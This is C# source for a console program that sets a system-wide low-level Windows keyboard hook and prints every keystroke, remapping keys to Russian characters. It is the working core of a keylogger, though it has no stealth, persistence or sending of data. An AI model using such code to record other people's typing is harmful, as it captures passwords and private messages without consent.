using System;
using System.Windows;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Collections.Generic;


namespace AppWork
{
    class Program
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        private static string En = "~!@#$%^&*()_+QWERTYUIOP{}|ASDFGHJKL:\"ZXCVBNM<>?`1234567890-=qwertyuiop[]\\asdfghjkl;'zxcvbnm,./↑←↓ ";
        private static string Ru = "Ё!\"№;%:?*()_+ЙЦУКЕНГШЩЗХЪ/ФЫВАПРОЛДЖЭЯЧСМИТЬБЮ,ё1234567890-=йцукенгшщзхъ\\фывапролджэячсмитьбю.↑←↓ ";

        private static char[] enen = En.ToCharArray();
        private static char[] ruru = Ru.ToCharArray();

        private static Dictionary<char, char> dictionary = new Dictionary<char, char>();
        private static void Language_mas()
        {
            for (int i = 0; i < enen.Length; i++)
            {
                dictionary.Add(enen[i], ruru[i]);
            }
        }

        private static void Litera(string ma)
        {
            InputLanguage myCurrent = InputLanguage.CurrentInputLanguage;
            char[] a = ma.ToCharArray();
            if (ma != "LShiftKey")
            {
                if (myCurrent.Culture.Name == "ru-RU")
                {
                    Console.WriteLine(dictionary[a[0]]);
                }
                if (myCurrent.Culture.Name == "ua-UA")
                {
                    Console.WriteLine(dictionary[a[0]]);
                }
                else Console.WriteLine(ma);
                //Console.WriteLine(ma[0]);

            }
            else
                Console.WriteLine(ma);


        }
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }


        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {

                int keyCode = Marshal.ReadInt32(lParam);
                KeysConverter kc = new KeysConverter();
                string a = InputLanguage.CurrentInputLanguage.Culture.DisplayName;
                string mystring = kc.ConvertToString((Keys)keyCode);
                Litera(mystring);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        static void Main(string[] args)
        {
            Language_mas();
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }
    }
}
